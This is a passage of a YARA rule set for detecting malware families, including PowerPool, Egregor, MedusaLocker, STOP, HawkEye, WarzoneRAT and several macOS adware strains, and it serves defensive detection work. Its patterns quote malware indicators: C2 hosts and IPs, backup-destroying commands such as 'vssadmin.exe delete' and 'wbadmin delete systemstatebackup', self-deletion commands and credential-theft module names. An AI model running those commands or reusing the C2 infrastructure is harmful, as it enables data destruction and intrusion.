$s2 = "cmd /c powershell.exe \"%s\" > \"%s\"" fullword wide
$s3 = "rar.exe a -r %s.rar -ta%04d%02d%02d%02d%02d%02d -tb%04d%02d%02d%02d%02d%02d" fullword wide
$s4 = "MyDemonMutex%d" fullword wide
$s5 = "MyScreen.jpg" fullword wide
$s6 = "proxy.log" fullword wide
$s7 = "myjt.exe" fullword wide
$s8 = "/?id=%s&info=%s" fullword wide
$s9 = "auto.cfg" fullword ascii
$s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64)" fullword wide
$s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)" fullword wide
$s12 = "CMD COMMAND EXCUTE ERROR!" fullword ascii
$c1 = "run.afishaonline.eu" fullword wide
$c2 = "home.Sports-Collectors.com" fullword wide
$c3 = "about.Sports-Collectors.com" fullword
$c4 = "179.43.158.15" fullword wide
$c5 = "185.227.82.35" fullword wide
condition:
uint16(0) == 0x5a4d and (all of ($s*) or (1 of ($c*) and 5 of ($s*)))
}
rule SSC_Win_PowerPool_STG2 {
meta:
author = "ditekSHen"
description = "Detects second stage PowerPool backdoor"
snort2_sid = "920089-920091"
snort3_sid = "920087-920089"
clamav_sig = "MALWARE.Win.Trojan.PowerPool-STG-2"
strings:
$s1 = "write info fail!!! GetLastError-->%u" fullword ascii
$s2 = "LookupAccountSid Error %u" fullword ascii
$s3 = "Mozilla/4.0 (compatible; )" fullword ascii
$s4 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SE)" fullword ascii
$s5 = "Content-Disposition: form-data; name=\"%s\"" fullword ascii
$s6 = "Content-Disposition: form-data; name=\"%s\"; filename=\"%s\"" fullword ascii
$s7 = "Content-Type: multipart/form-data; boundary=--MULTI-PARTS-FORM-DATA-BOUNDARY" fullword ascii
$s8 = "in Json::Value::find" fullword ascii
$s9 = "in Json::Value::resolveReference" fullword ascii
$s10 = "in Json::Value::duplicateAndPrefixStringValue" fullword ascii
$s11 = ".?AVLogicError@Json@@" fullword ascii
$s12 = ".?AVRuntimeError@Json@@" fullword ascii
$s13 = "http:\\\\82.221.101.157:80" ascii
$s14 = "http://172.223.112.130:80" ascii
$s15 = "http://172.223.112.130:443" ascii
$s16 = "http://info.newsrental.net:80" ascii
$s17 = "%s|%I64d" ascii
$s18 = "open internet failed..." ascii
$s19 = "connect failed..." ascii
$s20 = "handle not opened..." ascii
$s21 = "corrupted regex pattern" fullword ascii
$s22 = "add cookie failed..." ascii
condition:
uint16(0) == 0x5a4d and 14 of them
}
rule SSC_Win_Egregor {
meta:
author = "ditekSHen"
description = "Detects Egregor ransomware variants"
clamav_sig = "MALWARE.Win.Ransomware.Egregor"
strings:
$s1 = "C:\\Logmein\\{888-8888-9999}\\Logmein.log" fullword wide
$p1 = "--deinstall" fullword wide
$p2 = "--del" fullword wide
$p3 = "--exit" fullword wide
$p4 = "--kill" fullword wide
$p5 = "--loud" fullword wide
$p6 = "--nooperation" fullword wide
$p7 = "--nop" fullword wide
$p8 = "--skip" fullword wide
$p9 = "--useless" fullword wide
$p10 = "--yourmommy" fullword wide
$p11 = "-passegregor" ascii wide
$p12 = "-peguard" ascii wide
$p13 = "--nomimikatz" ascii wide
$p14 = "--multiproc" ascii wide
$p15 = "--killrdp" ascii wide
$p16 = "--nonet" ascii wide
$p17 = "--norename" ascii wide
$p18 = "--greetings" ascii wide
condition:
(uint16(0) == 0x5a4d and pe.is_dll() and ((all of ($s*) and 1 of ($p*)) or
(
2 of them and filesize < 1000KB and
for any i in (0 .. pe.number_of_sections) : (
(
pe.sections[i].name == ".00cfg"
)
)
)
)
) or 8 of ($p*)
}
rule SSC_Win_DLAgent02 {
meta:
author = "ditekSHen"
description = "Detects known downloader agent downloading encoded binaries in patches from paste-like websites, most notably hastebin"
clamav_sig = "MALWARE.Win.Trojan.DLAgent02"
strings:
$x1 = "/c timeout {0}" fullword wide
$x2 = "^(https?|ftp):\\/\\/" fullword wide
$x3 = "{0}{1}{2}{3}" wide
$x4 = "timeout {0}" fullword wide
$s1 = "HttpWebRequest" fullword ascii
$s2 = "GetResponseStream" fullword ascii
$s3 = "set_FileName" fullword ascii
$s4 = "set_UseShellExecute" fullword ascii
$s5 = "WebClient" fullword ascii
$s6 = "set_CreateNoWindow" fullword ascii
$s7 = "DownloadString" fullword ascii
$s8 = "WriteByte" fullword ascii
$s9 = "CreateUrlCacheEntryW" fullword ascii
$s10 = "HttpStatusCode" fullword ascii
$s11 = "FILETIME" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 5000KB and ((2 of ($x*) and 2 of ($s*)) or (#x3 > 2 and 4 of ($s*)))
}
rule SSC_Win_RedLineDropperEXE {
meta:
author = "ditekSHen"
description = "Detects executables dropping RedLine infostealer"
clamav_sig = "MALWARE.Win.Trojan.RedLineDropper-EXE"
strings:
$s1 = "Wizutezinod togeto0Rowadufevomuki futenujilazem jic lefogatenezinor" fullword wide
$s2 = "6Tatafamobevofaj bizafoju peyovavacoco lizine kezakajuj" fullword wide
$s3 = "Lawuherusozeru kucu zam0Zorizeyuk lepaposupu gala kinarusot ruvasaxehuwo" fullword wide
$s4 = "ClearEventLogW" fullword ascii
$s5 = "ProductionVersion" fullword wide
$s6 = "Vasuko)Yugenizugilobo toxocivoriye yexozoyohuzeb" wide
$s7 = "Yikezevavuzus gucajanesan#Rolapucededoxu xewulep fuwehofiwifi" wide
condition:
uint16(0) == 0x5a4d and (pe.exports("_fgeek@8") and 2 of them) or
(
2 of them and
for any i in (0 .. pe.number_of_sections) : (
(
pe.sections[i].name == ".rig"
)
)
)
}
rule SSC_Win_Nibiru {
meta:
author = "ditekSHen"
description = "Detects Nibiru ransomware"
clamav_sig = "MALWARE.Win.Ransomware.Nibiru"
strings:
$s1 = ".encrypt" fullword wide
$s2 = "crypted" fullword wide
$s3 = ".Nibiru" fullword wide
$s4 = "Encryption Complete" fullword wide
$s5 = "All your files,documents,important datas,mp4,mp3 and anything valuable" ascii
$s6 = "EncryptOrDecryptFile" fullword ascii
$s7 = "get_hacker" ascii
$s8 = "/C choice /C Y /N /D Y /T 3 & Del \"" fullword wide
$s9 = "Once You pay,you get the KEY to decrypt files" ascii
$pdb = "\\Projects\\Nibiru\\Nibiru\\obj\\x86\\Release\\Nibiru.pdb" ascii
condition:
uint16(0) == 0x5a4d and (7 of them or ($pdb and 2 of ($s*)))
}
rule SSC_Win_MedusaLocker {
meta:
author = "ditekshen"
description = "Detects MedusaLocker ransomware"
clamav_sig = "MALWARE.Win.Ransomware.MedusaLocker"
strings:
$x1 = "\\MedusaLockerInfo\\MedusaLockerProject\\MedusaLocker\\Release\\MedusaLocker.pdb" ascii
$x2 = "SOFTWARE\\Medusa" wide
$x3 = "=?utf-8?B?0RFQctTF0YDQcNC60IXQvdC+IEludGVybmV0IED4cGxvseVyIDEz?=" ascii
$s1 = "Recovery_Instructions.mht" fullword wide
$s2 = "README_LOCK.TXT" fullword wide
$s3 = "C:\\Users\\Public\\Desktop" wide
$s4 = "[LOCKER] " wide
$s5 = "TmV3LUl0ZW0gJ2" ascii
$s6 = "<HEAD>=20" ascii
$s7 = "LIST OF ENCRYPTED FILES" ascii
$s8 = "KEY.FILE" ascii
$cmd1 = { 2f 00 63 00 20 00 64 00 65 00 6c 00 20 00 00 00 20 00 3e 00 3e 00 20 00 4e 00 55 00 4c 00 }
$cmd2 = "vssadmin.exe delete" wide nocase
$cmd3 = "bcdedit.exe /set {default}" wide
$cmd4 = "wbadmin delete systemstatebackup" wide nocase
$mut1 = "{8761ABBD-7F85-42EE-B272-A76179687C63}" fullword wide
$mut2 = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}" fullword wide
$mut3 = "{6EDD6D74-C007-4E75-B76A-E5740995E24C}" fullword wide
$ext1 = { 2e 00 52 00 65 00 61 00 64 00 49 00 6e 00 73 00
74 00 72 00 75 00 63 00 74 00 69 00 6f 00 6e 00
73 00 00 00 00 00 00 00 2e 00 6b 00 65 00 76 00
65 00 72 00 73 00 65 00 6e }
$ext2 = ".exe,.dll,.sys,.ini,.lnk,.rdp,.encrypted" fullword ascii
condition:
uint16(0) == 0x5a4d and (2 of ($x*) or (1 of ($x*) and (4 of ($s*) or 1 of ($mut*))) or 6 of ($s*) or (1 of ($mut*) and 2 of ($cmd*)) or (1 of ($ext*) and 5 of them))
}
rule SSC_Win_RansomEXX {
meta:
author = "ditekshen"
description = "Detects RansomEXX ransomware"
clamav_sig = "MALWARE.Win.Ransomware.RansomEXX"
strings:
$id = "ransom.exx" ascii
$s1 = "!TXDOT_READ_ME!.txt" fullword wide
$s2 = "debug.txt" fullword wide
$s3 = ".txd0t" fullword wide
$s4 = "crypt_detect" fullword wide
$s5 = "powershell.exe" fullword wide
$s6 = "cipher.exe" fullword ascii wide
$s7 = "?ReflectiveLoader@@" ascii
condition:
uint16(0) == 0x5a4d and (($id and 3 of ($s*)) or all of ($*))
}
rule SSC_Win_QuasarStealer {
meta:
author = "ditekshen"
description = "Detects Quasar infostealer"
clamav_sig = "MALWARE.Win.Trojan.QuasarStealer"
strings:
$s1 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null" fullword ascii
$s2 = "DQuasar.Common, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii
$s3 = "Process already elevated." fullword wide
$s4 = "get_PotentiallyVulnerablePasswords" fullword ascii
$s5 = "GetKeyloggerLogsDirectory" ascii
$s6 = "set_PotentiallyVulnerablePasswords" fullword ascii
$s7 = "BQuasar.Client.Extensions.RegistryKeyExtensions+<GetKeyValues>" ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_Salfram {
meta:
author = "ditekSHen"
description = "Detects Salfram executables"
snort2_sid = "920085-920087"
snort3_sid = "920085"
clamav_sig = "MALWARE.Win.Trojan.Salfram"
strings:
$s1 = "!This Salfram cannot be run in DOS mode." fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_HawkEyeV9 {
meta:
author = "ditekshen"
description = "Detects HawkEyeV9 payload"
clamav_sig = "MALWARE.Win.Trojan.HawkEyeV9"
strings:
$id1 = "HawkEye Keylogger - Reborn v9 - {0} Logs - {1} \\ {2}" wide
$id2 = "HawkEye Keylogger - Reborn v9{0}{1} Logs{0}{2} \\ {3}{0}{0}{4}" wide
$str1 = "_PasswordStealer" ascii
$str2 = "_KeyStrokeLogger" ascii
$str3 = "_ScreenshotLogger" ascii
$str4 = "_ClipboardLogger" ascii
$str5 = "_WebCamLogger" ascii
$str6 = "_AntiVirusKiller" ascii
$str7 = "_ProcessElevation" ascii
$str8 = "_DisableCommandPrompt" ascii
$str9 = "_WebsiteBlocker" ascii
$str10 = "_DisableTaskManager" ascii
$str11 = "_AntiDebugger" ascii
$str12 = "_WebsiteVisitorSites" ascii
$str13 = "_DisableRegEdit" ascii
$str14 = "_ExecutionDelay" ascii
$str15 = "_InstallStartupPersistance" ascii
condition:
int16(0) == 0x5a4d and (1 of ($id*) or 5 of ($str*))
}
rule SSC_Win_HyperBro {
meta:
author = "ditekSHen"
description = "Detects HyperBro (class names) payload"
clamav_sig = "MALWARE.Win.Trojan.HyperBro"
strings:
$s1 = "VTClipboardInfo" ascii wide
$s2 = "VTClipboardMgr" ascii wide
$s3 = "VTFileRename" ascii wide
$s4 = "VTFileRetime" ascii wide
$s5 = "VTKeyboardInfo" ascii wide
$s6 = "VTKeyboardMgr" ascii wide
$s7 = "VTRegeditKeyInfo" ascii wide
$s8 = "VTRegeditMgr" ascii wide
$s9 = "VTRegeditValueInfo" ascii wide
$s10 = "VTFileDataRes" ascii wide
condition:
uint16(0) == 0x5a4d and 9 of them
}
rule SSC_Linux_UNK01 {
meta:
author = "ditekSHen"
description = "Detects unknown/unidentified Linux malware"
strings:
$f1 = "%sresponse.php?status" ascii
$f2 = "%supstream.php?mid=%s&os=%s" ascii fullword
$f3 = "%supstream.php?tid=%" ascii
$f4 = "%sindex.php?token=%.32s&flag=%d&name=%s" ascii fullword
$f5 = "%sactive_off.php?id=%d&uniqu=%d" ascii fullword
$s1 = "lock:%i usable num:%i n:%i" fullword ascii
$s2 = "tid:%.*s tNumber:%i" fullword ascii
$s3 = "init.php" fullword ascii
$s4 = "mod_drone" fullword ascii
$s5 = "new_mid" fullword ascii
$s6 = "&exists[]=" fullword ascii
$s7 = "&mod[]=" fullword ascii
$s8 = "shutdown" fullword ascii
$s9 = "&mac[]=%02X%02X%02X%02X%02X%02X" fullword ascii
condition:
uint16(0) == 0x457f and (3 of ($f*) or 6 of ($s*))
}
rule SSC_Linux_UNK02 {
meta:
author = "ditekSHen"
description = "Detects unknown/unidentified Linux malware"
strings:
$rf1 = "[]A\\A]A^A_" ascii
$rf2 = "[A\\A]A^A_]" ascii
$f1 = "/bin/basH" ascii fullword
$f2 = "/proc/seH" ascii fullword
$f3 = "/dev/ptsH" ascii fullword
$f4 = "pqrstuvwxyzabcde" ascii fullword
$f5 = "libnss_%s.so.%d.%d" ascii fullword
condition:
uint16(0) == 0x457f and (all of ($f*) and #rf1 > 3 and #rf2 > 3)
}
rule SSC_Win_iTranslatorEXE {
meta:
author = "ditekSHen"
description = "Detects iTranslator EXE payload"
clamav_sig = "MALWARE.Win.Trojan.iTranslator_EXE"
strings:
$s1 = "\\itranslator\\wintrans.exe" fullword wide
$s2 = "\\SuperX\\SuperX\\Obj\\Release\\SharpX.pdb" fullword ascii
$s3 = "\\itranslator\\itranslator.dll" fullword ascii
$s4 = ":Intoskrnl.exe" fullword ascii
$s5 = "InjectDrv.sys" fullword ascii
$s6 = "SharpX.dll" fullword wide
$s7 = "GetMicrosoftEdgeProcessId" ascii
$s8 = ".php?type=is&ch=" ascii
$s9 = ".php?uid=" ascii
$s10 = "&mc=" fullword ascii
$s11 = "&os=" fullword ascii
$s12 = "&x=32" fullword ascii
condition:
uint16(0) == 0x5a4d and 8 of ($s*)
}
rule SSC_Win_iTranslatorDLL {
meta:
author = "ditekSHen"
description = "Detects iTranslator DLL payload"
clamav_sig = "MALWARE.Win.Trojan.iTranslator_DLL"
strings:
$d1 = "system32\\drivers\\%S.sys" fullword wide
$d2 = "\\windows\\system32\\winlogon.exe" fullword ascii
$d3 = "\\Registry\\Machine\\SYSTEM\\ControlSet001\\services\\%s" fullword wide
$d4 = "\\Registry\\Machine\\SYSTEM\\ControlSet001\\services\\webssx" fullword wide
$d5 = "\\Device\\CtrlSM" fullword wide
$d6 = "\\DosDevices\\CtrlSM" fullword wide
$d7 = "\\driver_wfp\\CbFlt\\Bin\\CbFlt.pdb" ascii
$d8 = ".php" ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_CasperTroy {
meta:
author = "ditekSHen"
description = "Detects CasperTroy payload"
strings:
$s1 = "DllTroy.dll" fullword ascii
$s2 = "Content-Disposition: form-data; name=\"image\"; filename=\"title.gif\"" fullword ascii
$s3 = "Content-Disposition: form-data; name=\"COOKIE_ID\"" fullword ascii
$s4 = "Content-Disposition: form-data; name=\"PHP_SESS_ID\"" fullword ascii
$s5 = "Content-Disposition: form-data; name=\"SESS_ID\"" fullword ascii
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_Rasftuby {
meta:
author = "ditekSHen"
description = "Detects Rasftuby/DarkCrystal"
clamav_sig = "MALWARE.Win.Trojan.DarkCrystal.RAT-Rasftuby"
strings:
$s1 = "/DCRS/main.php?data=active" fullword ascii wide
$s2 = "/socket.php?type=__ds_" ascii wide
$s3 = "/uploader.php" fullword ascii wide
$s4 = "del \\\"%USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\System.lnk\\\"" fullword ascii wide
$s5 = "Host:{0},Port:{1},User:{2},Pass:{3}<STR>" fullword ascii wide
$s6 = "keyloggerstart_status" fullword ascii wide
$s7 = "keyloggerstop_status" fullword ascii wide
$s8 = "[PRINT SCREEN]" fullword ascii wide
$s9 = "DCS.Internal" ascii
condition:
uint16(0) == 0x5a4d and 5 of ($s*)
}
rule SSC_Win_ProtonBot {
meta:
author = "ditekSHen"
description = "Detects ProtonBot loader"
clamav_sig = "MALWARE.Win.Trojan.ProtonBot"
strings:
$x1 = "\\PROTON\\Release\\build.pdb" ascii
$x2 = "\\proton\\proton bot\\json.hpp" wide
$x3 = "proton bot" ascii wide
$s1 = "endptr == token_buffer.data() + token_buffer.size()" fullword wide
$s2 = "ranges.size() == 2 or ranges.size() == 4 or ranges.size() == 6" fullword wide
$s3 = "ref_stack.back()->is_array() or ref_stack.back()->is_object()" fullword wide
$s4 = "ktmw32.dll" fullword ascii
$s5 = "@detail@nlohmann@@" ascii
$s6 = "urlmon.dll" fullword ascii
condition:
uint16(0) == 0x5a4d and (2 of ($x*) or (all of ($s*) and 1 of ($x*)))
}
rule SSC_Win_ImminentRAT {
meta:
author = "ditekSHen"
description = "Detects ImminentRAT"
strings:
$x1 = "abuse@imminentmethods.net" ascii
$x2 = "Imminent-Monitor-" ascii
$x3 = "AddressChangeListener" fullword ascii
$x4 = "SevenZipHelper" fullword ascii
$x5 = "WrapNonExceptionThrows" fullword ascii
$s1 = "_ENABLE_PROFILING" wide
$s2 = "Anti-Virus: {0}" wide
$s3 = "File downloaded & executed" wide
$s4 = "Chat - You are speaking with" wide
$s5 = "\\Imminent\\Plugins" wide
$s6 = "\\Imminent\\Path.dat" wide
$s7 = "\\Imminent\\Geo.dat" wide
$s8 = "DisableTaskManager = {0}" wide
$s9 = "This client is already mining" wide
$s10 = "Couldn't get AV!" wide
$s11 = "Couldn't get FW!" wide
condition:
uint16(0) == 0x5a4d and (4 of ($x*) or 5 of ($s*))
}
rule SSC_Win_WarzoneRAT {
meta:
author = "ditekSHen"
description = "Detects AveMaria/WarzoneRAT"
strings:
$s1 = "RDPClip" fullword wide
$s2 = "Grabber" fullword wide
$s3 = "Ave_Maria Stealer OpenSource" wide
$s4 = "\\MidgetPorn\\workspace\\MsgBox.exe" wide
$s5 = "@\\cmd.exe" wide
$s6 = "/n:%temp%\\ellocnak.xml" wide
$s7 = "Hey I'm Admin" wide
$s8 = "warzone160" fullword ascii
condition:
uint16(0) == 0x5a4d and 5 of ($s*)
}
rule SSC_Win_KaraganyCore {
meta:
author = "ditekSHen"
description = "Detects Karagany/xFrost core plugin"
strings:
$s1 = "127.0.0.1" fullword ascii
$s2 = "port" fullword ascii
$s3 = "C:\\Windows\\System32\\Kernel32.dll" fullword ascii
$s4 = "kernel32.dll" fullword ascii
$s5 = "http" ascii
$s6 = "Move" fullword ascii
$s7 = "<supportedOS Id=\"{" ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_KaraganyKeylogger {
meta:
author = "ditekSHen"
description = "Detects Karagany/xFrost keylogger plugin"
strings:
$s1 = "__klg__" fullword wide
$s2 = "__klgkillsoft__" fullword wide
$s3 = "CLIPBOARD_PASTE" wide
$s4 = "%s\\k%d.txt" wide
$s5 = "\\Update\\Tmp" wide
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_KaraganyScreenUtil {
meta:
author = "ditekSHen"
description = "Detects Karagany/xFrost ScreenUtil module"
strings:
$s1 = "__pic__" ascii wide
$s2 = "__pickill__" ascii wide
$s3 = "\\picture.png" fullword wide
$s4 = "%d.jpg" wide
$s5 = "\\Update\\Tmp" wide
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_KaraganyListrix {
meta:
author = "ditekSHen"
description = "Detects Karagany/xFrost Listrix module"
strings:
$s1 = "\\Update\\Tmp\\" wide
$s2 = "*pass*.*" fullword wide
$s3 = ">> NUL" wide
$s4 = "%02d.%02d.%04d %02d:%02d" wide
$s5 = "/c del" wide
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Osx_MacSearch {
meta:
author = "ditekSHen"
description = "Detects MacSearch adware"
strings:
$s1 = "open -a safari" ascii
$s2 = "/INDownloader" ascii
$s3 = "/safefinder" ascii
$s4 = "/INEncryptor" ascii
$s5 = "/INInstallerFlow" ascii
$s6 = "/INConfiguration" ascii
$s7 = "/INChromeAndFFSetter" ascii
$s8 = "/INSafariSetter" ascii
$s9 = "/bin/launchctl" fullword ascii
$s10 = "/usr/bin/csrutil" fullword ascii
$s11 = "_Tt%cSs%zu%.*s%s" fullword ascii
$s12 = "_Tt%c%zu%.*s%zu%.*s%s" fullword ascii
$s13 = "/macap/safefinder_Obf/safefinder/" ascii
$s14 = "/safefinder.build/Release/macsearch.build/" ascii
condition:
uint16(0) == 0xfacf and 10 of them
}
rule SSC_Osx_Genieo {
meta:
author = "ditekSHen"
description = "Detects LinqurySearch/Genieo adware"
clamav_sig = "MALWARE.Osx.Trojan.Genieo"
strings:
$s1 = "<key>com.apple.security.get-task-allow</key>" fullword ascii
$s2 = "U1QQFXAfCxAfRUNCH1JZXh9" ascii
$s3 = "XVFTQ1VRQlNYH" ascii
$s4 = "dF9HXlxfUVQQVUJCX0IQHRB" ascii
$s5 = "Value:forHTTPHeaderField:" ascii
$s6 = "postContent:::" fullword ascii
$s7 = "postLog:" fullword ascii
$s8 = "initWithBase64EncodedString:options:" fullword ascii
$s9 = "do shell script \"%@\" with administrator privileges" fullword ascii
$s10 = /LinqurySearch-[a-f0-9]{40,}/
condition:
uint16(0) == 0xfacf and 6 of them
}
rule SSC_Osx_AMCPCVARK {
meta:
author = "ditekSHen"
description = "Detects OSX TechyUtils/PCVARK adware"
clamav_sig = "MALWARE.Osx.Adware.AMC-PCVARK-TechyUtils"
strings:
$s1 = "Mac Auto Fixer.app" fullword ascii
$s2 = "com.techyutil.macautofixer" fullword ascii
$s3 = "com.findApp.findApp" ascii
$s4 = "Library/Preferences/%@.plist" fullword ascii
$s5 = "Library/%@/%@" fullword ascii
$s6 = "Library/Application Support/%@/%@" fullword ascii
$s7 = "sleep 3; rm -rf \"%@\"" fullword ascii
$s8 = "Silently calling url: %@" ascii
$cnc1 = "cloudfront.net/getdetails" ascii
$cnc2 = "trk.entiretrack.com/trackerwcfsrv/tracker.svc/trackOffersAccepted/?" ascii
$cnc3 = "pxl=%@&x-count=1&utm_source=%@&lpid=0&utm_content=&utm_term=&x-base=&utm_medium=%@&utm_publisher=%@&offerpxl=&x-fetch=1&utm_campaign=@&affiliateid=&x-at=&btnid=" ascii
$x1 = "mafsysinfo" fullword ascii
$x2 = "MAF4497_MAF4399_MAF2204" ascii
$developerid = "Developer ID Application: Rahul Gahlot (RZ74UYT742)" ascii
condition:
uint16(0) == 0xfacf and (6 of ($s*) or 2 of ($cnc*) or all of ($x*) or $developerid)
}
rule SSC_Osx_RealtimeSpy {
meta:
author = "ditekSHen"
description = "Detects macOS RealtimeSpy monitoring app"
clamav_sig = "MALWARE.Osx.Trojan.RealtimeSpy"
strings:
$x1 = "SPYAGENT4HASHCIPHER" fullword ascii
$x2 = ":username:password:acctid:compUser:compName:" ascii
$x3 = ":username:password:acctid:compName:" ascii
$x4 = "://www.realtime-spy-mac.com/" ascii
$x5 = "/Users/spytech/" ascii
$x6 = "shell script \"touch /private/var/db/.AccessibilityAPIEnabled\" password \"pwd\" with administrator privileges" ascii
$x7 = "Content-Disposition: form-data; name=\"raptor_" ascii
$c1 = "_OBJC_CLASS_$_LocationLogger" fullword ascii
$c2 = "_OBJC_CLASS_$_MonitoringFunctions" fullword ascii
$c3 = "_OBJC_CLASS_$_ProcessLogger" fullword ascii
$c4 = "_OBJC_CLASS_$_RealtimeLoggingFunctions" fullword ascii
$c5 = "_OBJC_CLASS_$_Realtime_SpyAppDelegate" fullword ascii
$c6 = "_OBJC_CLASS_$_ScreenshotLogger" fullword ascii
$c7 = "_OBJC_CLASS_$_Uploader" fullword ascii
$c8 = "_OBJC_CLASS_$_UsageLogger" fullword ascii
$c9 = "_OBJC_CLASS_$_WebsiteLogger" fullword ascii
condition:
uint16(0) == 0xfacf and (2 of ($x*) or 2 of ($c*))
}
rule SSC_Osx_MaxOfferDeal {
meta:
author = "ditekSHen"
description = "Detects macOS MaxOfferDeal adware"
clamav_sig = "MALWARE.Osx.Adware.MaxOfferDeal"
strings:
$s1 = "clEvE15obfuscated_data" ascii
$s2 = "%.*s.%.*s" fullword ascii
$s3 = "_Tt%cSs%zu%.*s%s" fullword ascii
$s4 = "_Tt%c%zu%.*s%zu%.*s%s" fullword ascii
$s5 = "__ZL20tFirefoxProfilesPath" ascii
$s6 = "__ZL22tFirefoxSearchFileName" ascii
$s7 = "__ZL37tFirefoxDefaultProfileFolderExtension" ascii
$s8 = "__ZL21tFirefoxPrefsFileName" ascii
$s9 = "__GLOBAL__sub_I_Firefox.mm" ascii
$s10 = "add_image_hook_" ascii
$s11 = "/Library/Caches/com.apple.xbs/Sources/arclite/arclite-66/source/" fullword ascii
condition:
uint16(0) == 0xfacf and all of them
}
rule SSC_Osx_WindTrail {
meta:
author = "ditekSHen"
description = "Detects WindTrail OSX trojan"
clamav_sig = "MALWARE.Osx.Trojan.WindTrail"
strings:
$s1 = "m_ComputerName_UserName" fullword ascii
$s2 = "m_uploadURL" fullword ascii
$s3 = "m_logString" fullword ascii
$s4 = "GenrateDeviceName" fullword ascii
$s5 = "open -a" fullword ascii
$s6 = "AESEncryptFile:toFile:usingPassphrase:error:" fullword ascii
$s7 = "scheduledTimerWithTimeInterval:target:selector:userInfo:repeats:" fullword ascii
$s8 = "_kLSSharedFileListSessionLoginItems" fullword ascii
$developerid = "Developer ID Application: warren portman (95RKE2AA8F)" ascii
condition:
uint16(0) == 0xfacf and (all of ($s*) or $developerid)
}
rule SSC_Osx_TechyUtils {
meta:
author = "ditekSHen"
description = "Detects TechyUtils OSX packages"
clamav_sig = "MALWARE.Osx.Trojan.TechyUtils"
strings:
$s1 = "__ZL58__arclite_NSMutableDictionary__" ascii
$s2 = "__ZL46__arclite_NSDictionary_" ascii
$s3 = "<key>com.apple.security.get-task-allow</key>" fullword ascii
$s4 = "/productprice.svc/GetCountryCode" ascii
$s5 = "@_pthread_mutex_lock" fullword ascii
$s6 = "_mh_execute_header" fullword ascii
$s7 = "/Users/prasoon/Documents/" ascii
$developerid = "Developer ID Application: Techyutils Software Private Limited (VS9Q8BRRRJ)" ascii
condition:
uint16(0) == 0xfacf and (all of ($s*) or $developerid)
}
rule SSC_Osx_LamePyre {
meta:
description = "Detects LamePyre"
strings:
// wFlow
$s1 = "/Automator/Run Shell" ascii
$s2 = "curl " ascii
$s3 = "base64" ascii
$s4 = "screencapture" ascii
$s5 = "handler.php"
$s6 = "zip" ascii
// Persistence scripts
$ps1 = "base64.b64decode" ascii
$ps2 = "dXJsbGliM" ascii         // urllib2
$ps3 = "c3VicHJvY2Vz" ascii      // subprocess
$ps4 = "aW5kZXguYXN" ascii       // index.asp
$sp5 = "YWRkaGVhZGVy" ascii      // addheader
condition:
all of ($ps*) or 5 of ($s*)
}
rule SSC_Win_DLAgent04 {
meta:
author = "ditekSHen"
description = "Detects known downloader agent downloading encoded binaries in patches from paste-like websites, most notably hastebin"
clamav_sig = "MALWARE.Win.Trojan.DLAgent04"
strings:
$x1 = "@@@http" ascii wide
$s1 = "HttpWebRequest" fullword ascii
$s2 = "GetResponseStream" fullword ascii
$s3 = "set_FileName" fullword ascii
$s4 = "set_UseShellExecute" fullword ascii
$s5 = "WebClient" fullword ascii
$s6 = "set_CreateNoWindow" fullword ascii
$s7 = "DownloadString" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 300KB and #x1 > 1 and 4 of ($s*)
}
rule SSC_Win_GDriveRAT {
meta:
author = "ditekSHen"
description = "Detects GDriveRAT"
clamav_sig = "MALWARE.Win.Trojan.GDriveRAT"
strings:
$h1 = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart" fullword wide
$h2 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" fullword wide
$h3 = "multipart/related; boundary=\"boundary_tag\"" fullword wide
$h4 = "https://www.googleapis.com/drive/v3/files" fullword wide
$s1 = "move gdrive.exe \"C:\\Users\\" fullword wide
$s2 = "file_data" fullword ascii
$s3 = "comp_id" fullword ascii
$s4 = "file_name" fullword ascii
$s5 = "refresh_token" fullword ascii
$s6 = "commands" fullword ascii
$s7 = "execute" fullword ascii
condition:
uint16(0) == 0x5a4d and 3 of ($h*) and 5 of ($s*)
}
rule SSC_Win_STOP {
meta:
author = "ditekSHen"
description = "Detects STOP ransomware"
snort2_sid = "920113"
snort3_sid = "920111"
clamav_sig = "MALWARE.Win.Ransomware.STOP"
strings:
$x1 = "C:\\SystemID\\PersonalID.txt" fullword wide
$x2 = "/deny *S-1-1-0:(OI)(CI)(DE,DC)" wide
$x3 = "e:\\doc\\my work (c++)\\_git\\encryption\\" ascii wide nocase
$s1 = "\" --AutoStart" fullword ascii wide
$s2 = "--ForNetRes" fullword wide
$s3 = "--Admin" fullword wide
$s4 = "%username%" fullword wide
$s5 = "?pid=" fullword wide
$s6 = /&first=(true|false)/ fullword wide
$s7 = "delself.bat" ascii
$mutex1 = "{1D6FC66E-D1F3-422C-8A53-C0BBCF3D900D}" fullword ascii
$mutex2 = "{FBB4BCC6-05C7-4ADD-B67B-A98A697323C1}" fullword ascii
$mutex3 = "{36A698B9-D67C-4E07-BE82-0EC5B14B4DF5}" fullword ascii
condition:
uint16(0) == 0x5a4d and ((2 of ($x*) and 1 of ($mutex*)) or (all of ($x*)) or (6 of ($s*) and (1 of ($x*) or 1 of ($mutex*))) or (9 of them))
}
rule SSC_Win_ParallaxRAT {
meta:
author = "ditekSHen"
description = "Detects ParallaxRAT"
